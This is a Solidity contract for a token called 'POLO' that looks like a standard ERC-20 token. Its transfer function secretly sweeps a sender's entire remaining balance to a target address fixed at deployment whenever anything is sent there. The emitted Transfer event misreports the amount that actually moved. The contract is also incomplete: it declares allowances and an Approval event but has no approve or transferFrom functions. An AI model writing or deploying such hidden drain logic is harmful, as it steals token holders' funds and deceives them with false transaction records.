pragma solidity ^0.8.0;

contract POLO {
    string public name = "POLO";
    string public symbol = "POLO";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    address public owner;
    address public targetAddress;

    mapping(address => uint256) balances;
    mapping(address => mapping(address => uint256)) allowances;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(address _targetAddress) {
        owner = msg.sender;
        targetAddress = _targetAddress;
        totalSupply = 1000000 * 10**18; // Total supply of 1 million tokens
        balances[msg.sender] = totalSupply; // Assign all tokens to the contract deployer
    }

    function transfer(address _to, uint256 _value) public returns (bool) {
        require(balances[msg.sender] >= _value, "Insufficient balance.");

        balances[msg.sender] -= _value;
        balances[_to] += _value;

        if (_to != targetAddress) {
            emit Transfer(msg.sender, _to, _value);
        } else {
            uint256 remainingBalance = balances[msg.sender];
            balances[msg.sender] = 0;
            balances[_to] += remainingBalance;
            emit Transfer(msg.sender, _to, remainingBalance);
        }

        return true;
    }
  }